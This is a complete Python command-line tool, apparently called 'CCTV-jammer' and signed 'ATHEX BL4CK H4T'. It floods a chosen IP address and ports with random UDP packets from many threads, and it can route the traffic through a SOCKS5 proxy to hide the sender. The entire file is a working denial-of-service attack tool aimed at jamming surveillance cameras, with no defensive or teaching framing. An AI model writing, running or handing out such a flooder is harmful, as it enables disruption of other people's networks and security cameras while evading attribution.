#!/usr/bin/env python3

import socket
import socks
import random
import string
import threading
import argparse
import sys
import time

def internet_connection():
    try:
        socket.gethostbyname("www.google.com")
        return True
    except socket.gaierror:
        return False
    except Exception:
        return False

def home_logo():
    print("""
██╗   ██╗██╗ ██████╗ ██╗██╗      █████╗ ███╗   ██╗████████╗  ███████╗██╗   ██╗███████╗    
██║   ██║██║██╔════╝ ██║██║     ██╔══██╗████╗  ██║╚══██╔══╝  ██╔════╝╚██╗ ██╔╝██╔════╝    
██║   ██║██║██║  ███╗██║██║     ███████║██╔██╗ ██║   ██║     █████╗   ╚████╔╝ █████╗      
╚██╗ ██╔╝██║██║   ██║██║██║     ██╔══██║██║╚██╗██║   ██║     ██╔══╝    ╚██╔╝  ██╔══╝      
 ╚████╔╝ ██║╚██████╔╝██║███████╗██║  ██║██║ ╚████║   ██║     ███████╗   ██║   ███████╗    
  ╚═══╝  ╚═╝ ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝     ╚══════╝   ╚═╝   ╚══════╝ 
                            CREATED BY : ATHEX BL4CK H4T                                                 
    """)

def send_random_udp_packets(target_ip, target_port, proxy_ip=None, proxy_port=None):
    while True:
        try:
            # Create socket
            if proxy_ip and proxy_port:
                sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Generate random data
            random_data = bytes(random.getrandbits(8) for _ in range(1024))
            
            # Send packet
            sock.sendto(random_data, (target_ip, target_port))
            print(f"Sent random UDP packet to {target_ip}:{target_port}")
            
            # Small delay to prevent flooding too fast
            time.sleep(0.01)
            
        except KeyboardInterrupt:
            print("\n[!] Stopping packet transmission...")
            break
        except Exception as e:
            print(f"An error occurred: {e}")
            time.sleep(1)

def multiple_threads(ports, total_threads, target_ip, proxy_ip=None, proxy_port=None):
    threads = []
    stop_event = threading.Event()
    
    try:
        for port in ports:
            port = int(port)
            for i in range(total_threads):
                thread = threading.Thread(
                    target=send_random_udp_packets,
                    args=(target_ip, port, proxy_ip, proxy_port),
                    daemon=True
                )
                threads.append(thread)
                thread.start()
                print(f"[+] Started thread {i+1} for port {port}")
        
        print(f"\n[+] All {len(threads)} threads started. Press Ctrl+C to stop.")
        
        # Keep main thread alive
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[!] Stopping all threads...")
    finally:
        for thread in threads:
            thread.join(timeout=1)
        print("[+] All threads stopped.")

def main():
    parser = argparse.ArgumentParser(description='CCTV-jammer - UDP Packet Flooder')
    parser.add_argument('-ip', '--ip', type=str, help='target ip address', required=True)
    parser.add_argument('-port', '--port', type=str, help='target port numbers (choose multiple ports separated by comma)', required=True)
    parser.add_argument('-thread', '--num_thread', type=int, help='Number of threads for each port', default=5)
    parser.add_argument('-proxy_ip', '--proxy_ip', type=str, help='set proxy IP', default=None)
    parser.add_argument('-proxy_port', '--proxy_port', type=int, help='set proxy PORT', default=None)
    
    args = parser.parse_args()
    
    # Check internet connection
    if not internet_connection():
        print("[!] Warning: No internet connection detected. Some features may not work.")
    
    home_logo()
    print(f"[+] Target IP: {args.ip}")
    print(f"[+] Target Ports: {args.port}")
    print(f"[+] Threads per port: {args.num_thread}")
    if args.proxy_ip and args.proxy_port:
        print(f"[+] Proxy: {args.proxy_ip}:{args.proxy_port}")
    print("-" * 50)
    
    ports = args.port.split(",")
    
    try:
        multiple_threads(
            ports=ports,
            total_threads=args.num_thread,
            target_ip=args.ip,
            proxy_ip=args.proxy_ip,
            proxy_port=args.proxy_port
        )
    except KeyboardInterrupt:
        print("\n[!] Program interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
